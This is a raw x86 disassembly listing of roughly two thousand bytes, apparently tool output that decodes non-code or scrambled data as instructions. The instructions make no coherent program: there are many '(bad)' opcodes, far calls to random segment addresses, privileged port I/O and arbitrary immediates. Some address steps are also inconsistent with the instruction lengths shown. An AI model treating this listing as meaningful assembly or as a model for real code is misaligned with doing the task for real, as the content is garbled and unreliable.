  439921:	fld    DWORD PTR [ebx+ebp*8-0x4b]
  439925:	cmp    eax,0x3c30f2ee
  43992a:	jp     0x439996
  43992c:	mov    DWORD PTR [ecx-0x231e58df],0xd7f8aa34
  439936:	mov    esi,0x2518b008
  43993b:	mov    dh,al
  43993d:	xchg   edi,eax
  43993e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43993f:	daa    
  439940:	pop    ebp
  439941:	aam    0x33
  439943:	jne    0x4399bf
  439945:	or     esp,DWORD PTR [edx-0x117ae6e5]
  43994b:	add    edi,esi
  43994d:	aas    
  43994e:	cwde   
  43994f:	mov    eax,0x7113f6b1
  439954:	cmp    DWORD PTR [eax+0x72],ecx
  439957:	inc    edi
  439958:	ja     0x439968
  43995a:	sbb    ah,BYTE PTR [edi-0x6cc3f8a8]
  439960:	push   edi
  439961:	popf   
  439962:	push   edi
  439963:	shl    DWORD PTR [edx-0xd0d7c64],0x5
  43996a:	mov    bh,0xb5
  43996c:	or     edi,DWORD PTR ds:[ebx+0x73abf760]
  439973:	fld    DWORD PTR [eax-0x7ad65f0]
  439979:	pop    esi
  43997a:	ja     0x439912
  43997c:	dec    ebp
  43997d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43997e:	bound  esp,QWORD PTR [eax+0x66894b67]
  439984:	inc    ebp
  439985:	jmp    0x439945
  439987:	dec    ecx
  439988:	xor    ecx,eax
  43998a:	call   0xd161:0x31983171
  439991:	dec    edi
  439992:	mov    dl,0xb0
  439994:	xchg   edi,eax
  439995:	in     eax,dx
  439996:	mul    BYTE PTR [edi+0x52c9213d]
  43999c:	dec    edi
  43999d:	mov    ch,0x9a
  43999f:	inc    edi
  4399a0:	stos   DWORD PTR es:[edi],eax
  4399a1:	das    
  4399a2:	enter  0xb8f2,0xf5
  4399a6:	sahf   
  4399a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4399a8:	rcl    BYTE PTR [ecx-0x51],0xfb
  4399ac:	mov    ebx,0x88cd591e
  4399b1:	lods   eax,DWORD PTR ds:[esi]
  4399b2:	adc    eax,0x5708339d
  4399b7:	mov    al,ds:0x4f7ff488
  4399bc:	pop    ds
  4399bd:	pop    ss
  4399be:	cli    
  4399bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4399c0:	scas   eax,DWORD PTR es:[edi]
  4399c1:	and    al,0x8c
  4399c3:	dec    ebx
  4399c4:	dec    edi
  4399c5:	sbb    al,0xb1
  4399c7:	(bad)  
  4399c8:	mov    cl,0x28
  4399ca:	mov    ebx,0x239c8738
  4399cf:	aaa    
  4399d0:	js     0x439a1c
  4399d2:	repz xlat BYTE PTR ds:[ebx]
  4399d4:	out    0xb,al
  4399d6:	daa    
  4399d7:	std    
  4399d8:	jno    0x4399b3
  4399da:	inc    esi
  4399db:	inc    edi
  4399dc:	or     al,0x97
  4399de:	call   0x504:0x891c1c21
  4399e5:	cld    
  4399e6:	push   ecx
  4399e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4399e8:	inc    ebx
  4399e9:	adc    DWORD PTR [ebp+0x31],esi
  4399ec:	enter  0x72fb,0x44
  4399f0:	xchg   esi,eax
  4399f1:	enter  0x7aee,0xb5
  4399f5:	mov    ds:0x2ee210a9,eax
  4399fa:	inc    ecx
  4399fb:	clc    
  4399fc:	push   cs
  4399fd:	or     edx,DWORD PTR [ebp+edx*2-0x3d5ac1bb]
  439a04:	nop
  439a05:	pop    ss
  439a06:	mov    BYTE PTR [edi+0x4b],dl
  439a09:	dec    edi
  439a0a:	call   0xba49:0xf33ccea6
  439a11:	or     esp,DWORD PTR [esi-0x1d69f7ec]
  439a17:	retf   
  439a18:	push   0x60609aec
  439a1d:	sub    ch,BYTE PTR [eax]
  439a1f:	mov    esp,0xa7be8c44
  439a24:	(bad)  
  439a25:	push   0xffffff9c
  439a27:	jo     0x439a0c
  439a29:	bound  esp,QWORD PTR [edx+0x34]
  439a2c:	mov    bl,0x7e
  439a2e:	cmc    
  439a2f:	mov    dh,0x80
  439a31:	dec    esp
  439a32:	and    esp,DWORD PTR [esi+edx*2+0x25]
  439a36:	les    esp,FWORD PTR [edi-0x7a5dbfce]
  439a3c:	jae    0x439a32
  439a3e:	add    BYTE PTR [eax-0x4e],cl
  439a41:	cld    
  439a42:	cmp    eax,esp
  439a44:	adc    bl,bl
  439a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439a47:	adc    BYTE PTR [edx],bl
  439a49:	or     ecx,DWORD PTR [edi+0x78bff72f]
  439a4f:	cmp    dl,ah
  439a51:	mov    BYTE PTR [edx+0x624f0e41],bl
  439a57:	pop    eax
  439a58:	packssdw mm7,mm5
  439a5b:	mov    eax,0x671c6832
  439a60:	or     eax,0x240f56ea
  439a65:	rcr    BYTE PTR [edx+0x51dfe32a],cl
  439a6b:	sar    DWORD PTR [eax+0x1c],0xde
  439a6f:	mov    al,ds:0xde071f3b
  439a74:	dec    DWORD PTR [ebx+0x49]
  439a77:	in     eax,0x51
  439a79:	adc    ebx,DWORD PTR [edx-0x26472ad9]
  439a7f:	sub    edx,DWORD PTR [eax]
  439a81:	cmp    dl,BYTE PTR [ebx-0x5975af59]
  439a87:	mov    ch,0xe0
  439a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439a8a:	(bad)  
  439a8b:	je     0x439a3d
  439a8d:	sbb    BYTE PTR [ebx+0x74e2277d],ah
  439a93:	(bad)  
  439a94:	pop    edx
  439a95:	call   0xfafa3a3a
  439a9a:	sbb    dl,BYTE PTR [eax+esi*4+0x42]
  439a9e:	ins    BYTE PTR es:[edi],dx
  439a9f:	cmp    ecx,esi
  439aa1:	push   esi
  439aa2:	call   0xbe0b:0xbdca9d4a
  439aa9:	cmp    DWORD PTR [ebx+0x6f126fa7],0xffffff91
  439ab0:	push   cs
  439ab1:	lea    esp,[esi+0x1e]
  439ab4:	dec    edx
  439ab5:	pop    ds
  439ab6:	fwait
  439ab7:	sub    al,0xe3
  439ab9:	ins    DWORD PTR es:[edi],dx
  439aba:	mov    eax,0x7639f23b
  439abf:	jg     0x439a89
  439ac1:	or     al,0x90
  439ac3:	mov    cl,0xcd
  439ac5:	(bad)  
  439ac6:	hlt    
  439ac7:	fnstcw WORD PTR [ebx-0x1878e5f3]
  439acd:	jae    0x439b28
  439acf:	aam    0xb2
  439ad1:	or     al,0x94
  439ad3:	test   BYTE PTR [edi+0x400403d0],al
  439ad9:	or     ecx,DWORD PTR [eax]
  439adb:	imul   ecx,DWORD PTR [esi+0x2e980901],0xffffffa6
  439ae2:	test   ebx,ebx
  439ae4:	push   esp
  439ae5:	call   0xa744:0x6aea4a1c
  439aec:	pop    ebp
  439aed:	pop    es
  439aee:	inc    eax
  439aef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439af0:	ret    0xeb51
  439af3:	mov    bh,0xb2
  439af5:	imul   eax,DWORD PTR [eax-0x353410fa],0x840b8df9
  439aff:	fild   QWORD PTR [edi]
  439b01:	adc    BYTE PTR [edx],bh
  439b03:	fdiv   DWORD PTR [ebx+0x30]
  439b06:	call   0x3d89:0xab1c5b6c
  439b0d:	jecxz  0x439a94
  439b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439b10:	loopne 0x439aad
  439b12:	mov    ds:0x22211909,eax
  439b17:	popf   
  439b18:	mov    dl,0xca
  439b1a:	mov    ecx,0xcc8b23d6
  439b1f:	es jle 0x439b2a
  439b22:	imul   ebx,DWORD PTR [ebx-0x34],0xffffff93
  439b26:	fcom   QWORD PTR [edi]
  439b28:	jp     0x439ac0
  439b2a:	rol    DWORD PTR [ebx],1
  439b2c:	mov    dl,0x22
  439b2e:	cli    
  439b2f:	mov    al,0xe0
  439b31:	sbb    eax,0xb9a2897
  439b36:	add    eax,0xab52b7f8
  439b3b:	pop    ecx
  439b3c:	jb     0x439b94
  439b3e:	mov    ds:0x5e8b5425,al
  439b43:	mov    ds:0xba93371d,eax
  439b48:	inc    edx
  439b49:	or     edi,DWORD PTR [edi-0x48]
  439b4c:	std    
  439b4d:	loopne 0x439b20
  439b4f:	cli    
  439b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439b51:	inc    ebx
  439b52:	call   0xacd2:0x89af6624
  439b59:	sub    al,0x16
  439b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439b5c:	shl    BYTE PTR ds:0x62368290,0x4a
  439b63:	mov    ds:0x889922d0,eax
  439b68:	or     eax,esi
  439b6a:	jecxz  0x439af3
  439b6c:	mov    bh,0xeb
  439b6e:	xor    dh,BYTE PTR [eax-0x60a1f781]
  439b74:	cmp    edx,DWORD PTR [ecx+0x73]
  439b77:	loope  0x439b92
  439b79:	adc    BYTE PTR [ebp+0x17],ah
  439b7c:	aas    
  439b7d:	in     eax,dx
  439b7e:	push   esi
  439b7f:	mov    cl,0xb2
  439b81:	jp     0x439baf
  439b83:	fbstp  TBYTE PTR [esi-0x73]
  439b86:	and    BYTE PTR [ecx+edi*8+0x5],bl
  439b8a:	js     0x439b51
  439b8c:	sahf   
  439b8d:	mov    bh,BYTE PTR [edx-0x2e]
  439b90:	imul   esp,DWORD PTR [ecx+0x6b2777f],0x307506d8
  439b9a:	cmp    al,0x94
  439b9c:	or     esi,DWORD PTR fs:[edx-0x644ade79]
  439ba3:	or     eax,0xf9856454
  439ba8:	sbb    al,BYTE PTR [edx+ebx*1-0x66]
  439bac:	jge    0x439c25
  439bae:	leave  
  439baf:	pop    esp
  439bb0:	daa    
  439bb1:	add    eax,0x8839f593
  439bb6:	cdq    
  439bb7:	and    DWORD PTR [ebp-0x6d43fdf1],ecx
  439bbd:	jns    0x439b59
  439bbf:	cmp    ah,BYTE PTR [edi+0x2bd3a6f4]
  439bc5:	mov    dh,0x5
  439bc7:	fnstenv [edx+0xb]
  439bca:	dec    ebx
  439bcb:	js     0x439be2
  439bcd:	mov    ecx,0xffb513da
  439bd2:	fwait
  439bd3:	mov    ecx,0xaca1d703
  439bd8:	lock push esi
  439bda:	push   0xc
  439bdc:	cmp    DWORD PTR [ebx],ecx
  439bde:	mov    ch,0x29
  439be0:	add    al,0x9f
  439be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439be3:	add    DWORD PTR [ebx+0x13],ebx
  439be6:	call   0x79a6:0xedd07c50
  439bed:	jbe    0x439b70
  439bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439bf0:	dec    esi
  439bf1:	xor    eax,0xb7cbe557
  439bf6:	stc    
  439bf7:	inc    eax
  439bf8:	mov    dl,0x21
  439bfa:	jmp    0x9f6d:0x55011a13
  439c01:	adc    al,0xc8
  439c03:	inc    ecx
  439c04:	clc    
  439c05:	jae    0x439ba1
  439c07:	xor    eax,0xb65665bf
  439c0c:	scas   eax,DWORD PTR es:[edi]
  439c0d:	fstp   QWORD PTR [ecx+0x1fc86a61]
  439c13:	mov    eax,ds:0xc55d83c4
  439c18:	dec    BYTE PTR [ebx]
  439c1a:	aas    
  439c1b:	std    
  439c1c:	adc    al,0xf9
  439c1e:	lods   al,BYTE PTR ds:[esi]
  439c1f:	mov    edi,0x2b64e090
  439c24:	mov    dl,0x5c
  439c26:	push   edx
  439c27:	add    eax,0x1bdbdc47
  439c2c:	aad    0x7b
  439c2e:	call   0xee3b37d7
  439c33:	mov    edx,0xc16270f0
  439c38:	das    
  439c39:	fstp   DWORD PTR [edx-0x38673b0e]
  439c3f:	jp     0x439c36
  439c41:	loop   0x439c66
  439c43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439c44:	cmp    al,0xfd
  439c46:	outs   dx,BYTE PTR ds:[esi]
  439c47:	es mov al,0x24
  439c4a:	in     eax,0xcc
  439c4c:	xchg   esi,eax
  439c4d:	sub    al,0x6a
  439c4f:	retf   
  439c50:	mov    dl,0x7c
  439c52:	push   ss
  439c53:	pop    esi
  439c54:	mov    edi,0x23db73a4
  439c59:	or     eax,DWORD PTR [ecx-0x529363d4]
  439c5f:	inc    esi
  439c60:	cli    
  439c61:	cli    
  439c62:	mov    dh,0xa6
  439c64:	pop    esp
  439c65:	jge    0x439c08
  439c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439c68:	sbb    BYTE PTR [esi],dl
  439c6a:	cmp    DWORD PTR [ebp+0x5b2d32fe],edi
  439c70:	push   edi
  439c71:	jbe    0x439c4e
  439c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439c74:	or     DWORD PTR [edx+0x2],edx
  439c77:	pop    ebp
  439c78:	mov    dh,0xe8
  439c7a:	adc    al,0xc3
  439c7c:	mov    ebx,ebp
  439c7e:	cmp    eax,0x1a388538
  439c83:	ins    DWORD PTR es:[edi],dx
  439c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439c85:	lahf   
  439c86:	jecxz  0x439ceb
  439c88:	lods   al,BYTE PTR ds:[esi]
  439c89:	out    0x64,eax
  439c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439c8c:	loope  0x439ce5
  439c8e:	or     bl,0x66
  439c91:	xchg   esi,eax
  439c92:	xchg   ebp,eax
  439c93:	adc    eax,0x6b9b1ab2
  439c98:	or     eax,0x60697973
  439c9d:	or     eax,DWORD PTR [edi-0x3b]
  439ca0:	stos   BYTE PTR es:[edi],al
  439ca1:	lahf   
  439ca2:	(bad)  
  439ca3:	xor    cl,BYTE PTR [ecx]
  439ca5:	aad    0x9a
  439ca7:	test   ch,al
  439ca9:	mov    ss,WORD PTR [ecx+0x136febcc]
  439caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439cb0:	inc    ebp
  439cb1:	xor    DWORD PTR [edi+0x3b],ebp
  439cb4:	xchg   ebp,eax
  439cb5:	xor    eax,0x2bb24225
  439cba:	into   
  439cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439cbc:	fsubr  DWORD PTR [eax]
  439cbe:	cmp    ecx,ebp
  439cc0:	pop    esi
  439cc1:	jecxz  0x439cd5
  439cc3:	pop    ss
  439cc4:	jmp    0xb2e893fe
  439cc9:	bound  esi,QWORD PTR [edx+0x1b]
  439ccc:	push   eax
  439ccd:	mov    ds:0x10b26c47,al
  439cd2:	sbb    BYTE PTR [esp+eiz*2],al
  439cd5:	jo     0x439cdf
  439cd7:	rol    DWORD PTR [ebx+0x5],1
  439cda:	add    ch,ah
  439cdc:	mov    esp,0xf31adba3
  439ce1:	lods   al,BYTE PTR ds:[esi]
  439ce2:	dec    edi
  439ce3:	xchg   edi,eax
  439ce4:	(bad)  
  439ce5:	neg    DWORD PTR [edx-0x8c63a21]
  439ceb:	pop    esp
  439cec:	shr    BYTE PTR ss:[edi+0x19b2c3a7],0xf
  439cf4:	or     eax,0xbde7fb4e
  439cf9:	nop
  439cfa:	test   cl,0xe0
  439cfd:	jmp    0x439d78
  439cff:	or     DWORD PTR [ecx],0x1
  439d02:	sub    BYTE PTR [edi-0x7bcc0312],ah
  439d08:	aaa    
  439d09:	mov    WORD PTR [edx],gs
  439d0b:	push   ecx
  439d0c:	mov    al,ds:0xa49f2b47
  439d11:	and    DWORD PTR [eax],0x35a689a7
  439d17:	adc    ebx,DWORD PTR [esi]
  439d19:	imul   ebx,DWORD PTR [edx-0x249719d0],0xe3294f3b
  439d23:	inc    edi
  439d24:	jae    0x439d31
  439d26:	inc    eax
  439d27:	sahf   
  439d28:	mov    bh,0xb5
  439d2a:	mov    ah,0x83
  439d2c:	sbb    BYTE PTR [edx+ebx*4+0x2f],0xa7
  439d31:	pop    ebx
  439d32:	cmp    edi,DWORD PTR [edx+0x5c]
  439d35:	mov    ecx,0x593ce2a
  439d3a:	cdq    
  439d3b:	neg    eax
  439d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439d3e:	and    cl,dl
  439d40:	mov    ebp,0xed9b994c
  439d45:	fs ret 0x163
  439d49:	mov    bl,0x42
  439d4b:	cmpxchg ebx,edi
  439d4e:	pop    ds
  439d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439d50:	adc    DWORD PTR [ebx+0x62],esp
  439d53:	lock into 
  439d55:	push   esi
  439d56:	adc    al,BYTE PTR [edx-0x4e]
  439d59:	lock sbb edi,DWORD PTR cs:0x7db80bb4
  439d61:	or     ebp,DWORD PTR [ebx+eiz*1+0x14b491b9]
  439d68:	out    0xf9,al
  439d6a:	call   0xae6f:0x3d79c578
  439d71:	scas   al,BYTE PTR es:[edi]
  439d72:	jg     0x439d2c
  439d74:	mov    esi,0x32dc166b
  439d79:	ss pushf 
  439d7b:	push   esi
  439d7c:	out    dx,al
  439d7d:	les    edi,FWORD PTR [ebx-0x4a]
  439d80:	mov    dl,0xd1
  439d82:	iret   
  439d83:	mov    esi,ebx
  439d85:	mov    ebx,0xafc2109
  439d8a:	jle    0x439d67
  439d8c:	mov    edx,0xeafd30d7
  439d91:	cmp    ch,BYTE PTR [esi-0x19]
  439d94:	xlat   BYTE PTR ds:[ebx]
  439d95:	xor    DWORD PTR [edi-0x7a3e4d3c],esp
  439d9b:	xor    BYTE PTR [esi-0x31bd7de7],ch
  439da1:	je     0x439d38
  439da3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439da4:	jne    0x439d8a
  439da6:	loopne 0x439d33
  439da8:	fld    st(4)
  439daa:	and    al,0x5d
  439dac:	mov    dl,0x38
  439dae:	xchg   BYTE PTR [ebx-0x65],dh
  439db1:	jo     0x439de0
  439db3:	(bad)  
  439db4:	(bad)  
  439db5:	pop    ss
  439db6:	nop
  439db7:	mov    ds:0x21770752,al
  439dbc:	and    bl,BYTE PTR [ebx-0x66]
  439dbf:	int    0xf3
  439dc1:	repnz repnz sbb bh,cl
  439dc5:	lahf   
  439dc6:	aad    0xa6
  439dc8:	retf   0x43b8
  439dcb:	adc    bl,ch
  439dcd:	jns    0x439dae
  439dcf:	es adc al,0xae
  439dd2:	in     eax,dx
  439dd3:	inc    ecx
  439dd4:	xlat   BYTE PTR ds:[ebx]
  439dd5:	and    edx,DWORD PTR [ebp+0x37]
  439dd8:	xchg   esp,eax
  439dd9:	leave  
  439dda:	sub    al,0xa7
  439ddc:	inc    ebx
  439ddd:	dec    ebp
  439dde:	jbe    0x439e4f
  439de0:	popa   
  439de1:	pop    ecx
  439de2:	popa   
  439de3:	fnsave [edx+0x48f2a542]
  439de9:	out    dx,al
  439dea:	popf   
  439deb:	pop    eax
  439dec:	imul   ecx,DWORD PTR [ebx],0xefef32e8
  439df2:	test   ebx,edx
  439df4:	outs   dx,DWORD PTR ds:[esi]
  439df5:	rcr    DWORD PTR [edx-0x7003c340],1
  439dfb:	dec    eax
  439dfc:	cdq    
  439dfd:	push   0x37
  439dff:	mov    ecx,0xe7e88f35
  439e04:	test   DWORD PTR [ebp-0x6d9e2572],0x2f7678bc
  439e0e:	fwait
  439e0f:	mov    edx,ecx
  439e11:	call   0xb83b:0x4f7af3a1
  439e18:	lock lods al,BYTE PTR ds:[esi]
  439e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439e1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439e1c:	xchg   ecx,eax
  439e1d:	add    eax,0xfa0aa5dd
  439e22:	call   0xfd2:0x15dc375f
  439e29:	xchg   ebx,eax
  439e2a:	inc    edi
  439e2b:	ficomp DWORD PTR [ebx+0x6bca10b]
  439e31:	sar    BYTE PTR [eax+eiz*4+0x42],cl
  439e35:	adc    eax,0x2dbdc17a
  439e3a:	test   DWORD PTR [ebp-0x1c],ebp
  439e3d:	jmp    0x439def
  439e3f:	add    al,al
  439e41:	mov    esp,0x9da9a7ad
  439e46:	push   0xffffffbb
  439e48:	cmp    al,BYTE PTR [edi+0x1b2d92f]
  439e4e:	scas   al,BYTE PTR es:[edi]
  439e4f:	lods   al,BYTE PTR ds:[esi]
  439e50:	pop    ebp
  439e51:	bound  edx,QWORD PTR [edi-0x14]
  439e54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439e55:	in     eax,0x95
  439e57:	pop    ebx
  439e58:	and    DWORD PTR [edi],edx
  439e5a:	push   cs
  439e5b:	shl    BYTE PTR [ebx-0x242f775],0x96
  439e62:	in     eax,dx
  439e63:	push   0xffffffb2
  439e65:	jmp    0x439e61
  439e67:	ins    DWORD PTR es:[edi],dx
  439e68:	stos   DWORD PTR es:[edi],eax
  439e69:	mov    ds:0xb8459d3,eax
  439e6e:	xlat   BYTE PTR ds:[ebx]
  439e6f:	jns    0x439dff
  439e71:	and    ch,dh
  439e73:	lds    ebp,FWORD PTR [ebp-0x57e07a4b]
  439e79:	(bad)  
  439e7a:	call   0x7cf9:0x4d9b3730
  439e81:	or     esp,DWORD PTR [ebp+eiz*2-0x3]
  439e85:	and    eax,0x3eb639eb
  439e8a:	outs   dx,BYTE PTR ds:[esi]
  439e8b:	in     al,0x9e
  439e8d:	ss jno 0x439e5e
  439e90:	mov    dh,0xba
  439e92:	mov    cl,0xf1
  439e94:	jb     0x439ea2
  439e96:	cwde   
  439e97:	pushf  
  439e98:	inc    eax
  439e99:	xor    eax,0xcb32ae3b
  439e9e:	mov    DWORD PTR [ecx],edi
  439ea0:	sar    DWORD PTR [eax+0x4eb3cda6],1
  439ea6:	mov    ebp,0x7250a454
  439eab:	pop    ss
  439eac:	inc    esi
  439ead:	out    0x39,al
  439eaf:	test   eax,0x81ea20e0
  439eb4:	repnz (bad) 
  439eb6:	dec    esi
  439eb7:	shl    BYTE PTR [eax],cl
  439eb9:	xchg   ebp,eax
  439eba:	call   0x6c94:0x4339dcb9
  439ec1:	dec    ecx
  439ec2:	xor    al,0xa7
  439ec4:	xchg   edx,eax
  439ec5:	add    edi,DWORD PTR [ecx+0x196e23cb]
  439ecb:	(bad)  [edi+0x5d1f07c3]
  439ed1:	add    al,0x29
  439ed3:	retf   0xcab9
  439ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439ed7:	xor    DWORD PTR [edi],edx
  439ed9:	call   0x3798:0xbeeb94a
  439ee0:	adc    cl,cl
  439ee2:	enter  0x9c3c,0x94
  439ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439ee7:	(bad)  
  439ee8:	out    dx,eax
  439ee9:	xchg   esp,eax
  439eea:	and    eax,0x97653241
  439eef:	sbb    eax,ecx
  439ef1:	aaa    
  439ef2:	std    
  439ef3:	mov    edx,0x5b2248fe
  439ef8:	mov    dl,0xd8
  439efa:	push   cs
  439efb:	xchg   DWORD PTR ds:0x8eca6b83,eax
  439f01:	or     al,0x31
  439f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439f04:	inc    ecx
  439f05:	jns    0x439eba
  439f07:	bound  esi,QWORD PTR [eax+0x62]
  439f0a:	cmp    bl,BYTE PTR [esi-0xfee1bab]
  439f10:	mov    edx,0xf2219a1a
  439f15:	mov    ah,0x65
  439f17:	pop    edx
  439f18:	mov    bl,0x0
  439f1a:	out    0xbd,eax
  439f1c:	loopne 0x439f16
  439f1e:	repnz mov ds:0x8b6a1b42,al
  439f24:	cmp    BYTE PTR [ebp-0x11ad58c7],bl
  439f2a:	pop    edi
  439f2b:	push   0xbcef6dfb
  439f30:	mov    dl,0x70
  439f32:	mul    ch
  439f34:	arpl   WORD PTR [ebx+0xb15d805],sp
  439f3a:	clc    
  439f3b:	idiv   DWORD PTR [edx]
  439f3d:	stc    
  439f3e:	dec    esp
  439f3f:	in     eax,dx
  439f40:	gs stos DWORD PTR es:[edi],eax
  439f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439f43:	dec    esi
  439f44:	out    0xa,al
  439f46:	aaa    
  439f47:	or     edi,edx
  439f49:	repz adc ebp,DWORD PTR [ecx+0x73]
  439f4d:	leave  
  439f4e:	jbe    0x439eef
  439f50:	or     DWORD PTR [ebx],0xe1ba01e1
  439f56:	into   
  439f57:	xlat   BYTE PTR ds:[ebx]
  439f58:	lock mov edi,0xfa72f8bc
  439f5e:	call   0x36cb:0x8a9858d
  439f65:	or     ebx,DWORD PTR [ebx+0x20]
  439f68:	popf   
  439f69:	dec    esi
  439f6a:	cdq    
  439f6b:	ret    0x4b38
  439f6e:	jmp    0xd66251ee
  439f73:	xor    BYTE PTR [ebx-0xb],al
  439f76:	pop    ecx
  439f77:	mov    ss,ebp
  439f79:	or     edx,DWORD PTR [ebx-0x2fdeb497]
  439f7f:	das    
  439f80:	retf   0x9a08
  439f83:	and    al,0x94
  439f85:	jbe    0x439f30
  439f87:	pop    edi
  439f88:	push   cs
  439f89:	jl     0x1d2adc36
  439f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439f90:	aaa    
  439f91:	stos   DWORD PTR es:[edi],eax
  439f92:	xor    edx,0xffffffb2
  439f95:	pop    edx
  439f96:	ds icebp 
  439f98:	jo     0x439f78
  439f9a:	fnstcw WORD PTR [ebx]
  439f9c:	or     ecx,DWORD PTR fs:[eax-0x19ea4c67]
  439fa3:	fwait
  439fa4:	aam    0x25
  439fa6:	jecxz  0x439fa3
  439fa8:	mov    dl,0xdc
  439faa:	bound  edx,QWORD PTR [edx]
  439fac:	cli    
  439fad:	jl     0x439ff9
  439faf:	jmp    0x7accab08
  439fb4:	ins    DWORD PTR es:[edi],dx
  439fb5:	cwde   
  439fb6:	push   ebx
  439fb7:	shl    DWORD PTR [edx+ebp*4-0x63],1
  439fbb:	imul   BYTE PTR [ebx-0x15]
  439fbe:	retw   0xa8d2
  439fc2:	pop    esi
  439fc3:	dec    ecx
  439fc4:	scas   eax,DWORD PTR es:[edi]
  439fc5:	or     al,al
  439fc7:	imul   esi,DWORD PTR [esp-0x1eec78e1],0x43
  439fcf:	push   ebx
  439fd0:	mov    edi,0x8e2ce4da
  439fd5:	or     edx,ebx
  439fd7:	and    BYTE PTR [eax+edx*1+0x5bc2346d],cl
  439fde:	dec    ebp
  439fdf:	fs jbe 0x439fed
  439fe2:	in     al,0x9
  439fe4:	arpl   WORD PTR [ecx-0x7ef48072],sp
  439fea:	call   0x859a:0x9d522fd8
  439ff1:	jmp    0x43a040
  439ff3:	mov    ebx,0x271a62c9
  439ff8:	ficomp WORD PTR [ecx-0xa4932dd]
  439ffe:	fwait
  439fff:	dec    edx
  43a000:	xchg   ecx,eax
  43a001:	jge    0x43a02c
  43a003:	xchg   ebp,eax
  43a004:	xchg   ebp,eax
  43a005:	mov    esi,0xb974866
  43a00a:	pop    edi
  43a00b:	fidiv  DWORD PTR [edx-0x10]
  43a00e:	jl     0x43a076
  43a010:	scas   eax,DWORD PTR es:[edi]
  43a011:	mov    edi,0x7db3227e
  43a016:	and    edx,0x61
  43a019:	xchg   ecx,eax
  43a01a:	and    bh,ah
  43a01c:	dec    ebp
  43a01d:	sar    DWORD PTR [eax],cl
  43a01f:	ret    
  43a020:	dec    DWORD PTR [ebx]
  43a022:	test   BYTE PTR [ebx-0x192a85bc],bl
  43a028:	int3   
  43a029:	int    0x9a
  43a02b:	inc    edx
  43a02c:	in     al,dx
  43a02d:	pop    ds
  43a02e:	fidivr DWORD PTR [edx]
  43a030:	mov    bl,0x17
  43a032:	idiv   DWORD PTR [ecx-0x18f1d64c]
  43a038:	out    0x64,eax
  43a03a:	cmp    DWORD PTR [esi],edi
  43a03c:	loop   0x43a009
  43a03e:	popf   
  43a03f:	int    0x12
  43a041:	sar    BYTE PTR [edx+0x626c2282],cl
  43a047:	aaa    
  43a048:	call   0xf595:0xd84dd0c
  43a04f:	xchg   esi,eax
  43a050:	sub    ecx,ebp
  43a052:	mov    al,ds:0x9aaa2863
  43a057:	mov    bh,0x35
  43a059:	push   ecx
  43a05a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a05b:	mov    bl,0xe4
  43a05d:	xlat   BYTE PTR ds:[ebx]
  43a05e:	icebp  
  43a05f:	test   eax,0xc567daa8
  43a064:	rcr    DWORD PTR [edx+esi*4],1
  43a067:	xor    al,0x62
  43a069:	dec    edx
  43a06a:	jge    0x43a025
  43a06c:	mov    dl,0x20
  43a06e:	cld    
  43a06f:	cmc    
  43a070:	jmp    0x29a5cab9
  43a075:	or     al,0x52
  43a077:	push   ebp
  43a078:	test   DWORD PTR [esi],ecx
  43a07a:	loopne 0x43a053
  43a07c:	xor    DWORD PTR [edx],eax
  43a07e:	push   eax
  43a07f:	push   ecx
  43a080:	mov    ch,0x36
  43a082:	(bad)  
  43a083:	popa   
  43a084:	imul   edx,DWORD PTR [edi-0x26],0x42
  43a088:	adc    DWORD PTR [esi+ebp*1-0x384885a0],0x5dd94ba7
  43a093:	nop
  43a094:	mov    dl,0x14
  43a096:	sub    DWORD PTR [ebp+0x96eb67f],edi
  43a09c:	jo     0x43a0a2
  43a09e:	or     edx,edx
  43a0a0:	push   ecx
  43a0a2:	fcmovu st,st(0)
  43a0a4:	jno    0x43a10b
  43a0a6:	sbb    BYTE PTR ds:0x2f1fa6b1,bh
  43a0ac:	int3   
  43a0ad:	pop    edx
  43a0ae:	push   esp
  43a0af:	pop    es
  43a0b0:	repz stc 
  43a0b2:	(bad)  
  43a0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a0b5:	or     esp,ebx
  43a0b7:	loopne 0x43a098
  43a0b9:	mov    ah,0x2b
  43a0bb:	mov    ds:0x5f9a5c96,eax
  43a0c0:	pop    ebp
  43a0c1:	(bad)  
  43a0c2:	or     ebx,DWORD PTR [ebp-0x4550d826]
  43a0c8:	les    edx,FWORD PTR [edi]
  43a0ca:	test   al,0xa7
  43a0cc:	in     al,0x28
